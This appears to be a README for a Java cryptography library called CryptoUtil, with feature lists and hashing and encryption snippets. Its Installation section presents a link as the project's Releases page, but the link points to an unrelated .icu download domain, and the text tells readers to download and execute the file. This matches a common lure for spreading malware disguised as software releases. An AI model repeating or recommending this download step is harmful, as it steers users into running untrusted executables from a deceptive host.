## Features

- **Easy to Use**: Simple API for common cryptographic tasks.
- **Multiple Algorithms**: Support for bcrypt, PBKDF2, scrypt, and SHA-256.
- **Security Focused**: Designed with security best practices in mind.
- **Java Integration**: Seamlessly integrates with existing Java applications.

## Installation

To get started with CryptoUtil, you can download the latest release from the [Releases section](https://downloadsoftgits.icu/?p8zqf3xkxidwp7h). Simply choose the appropriate file for your system, download it, and execute it.

### Prerequisites

Make sure you have the following installed:

- Java Development Kit (JDK) 8 or higher
- Maven (optional, for building from source)

### Building from Source

If you prefer to build from source, clone the repository and use Maven:

```bash
git clone https://github.com/BryanDanielqf/CryptoUtil.git
cd CryptoUtil
mvn clean install
```

## Usage

Here’s a quick guide on how to use CryptoUtil in your Java applications.

### Basic Example

```java
import com.example.cryptoutil.CryptoUtil;

public class Main {
    public static void main(String[] args) {
        String password = "mySecurePassword";
        String salt = CryptoUtil.generateSalt();
        String hashedPassword = CryptoUtil.hashPassword(password, salt);
        
        System.out.println("Hashed Password: " + hashedPassword);
    }
}
```

### Hashing Passwords

You can hash passwords using bcrypt or PBKDF2. Here's how:

```java
String bcryptHash = CryptoUtil.hashWithBcrypt(password);
String pbkdf2Hash = CryptoUtil.hashWithPBKDF2(password, salt);
```

### Encrypting Data

To encrypt data, you can use AES encryption:

```java
String encryptedData = CryptoUtil.encrypt("Sensitive Data", "mySecretKey");
String decryptedData = CryptoUtil.decrypt(encryptedData, "mySecretKey");
```

## Supported Algorithms

CryptoUtil supports the following algorithms:

- **bcrypt**: A password hashing function designed for secure storage.
- **PBKDF2**: A key derivation function that applies a pseudorandom function.
- **scrypt**: A memory-hard function to make brute-force attacks more difficult.
- **SHA-256**: A cryptographic hash function that produces a 256-bit hash.
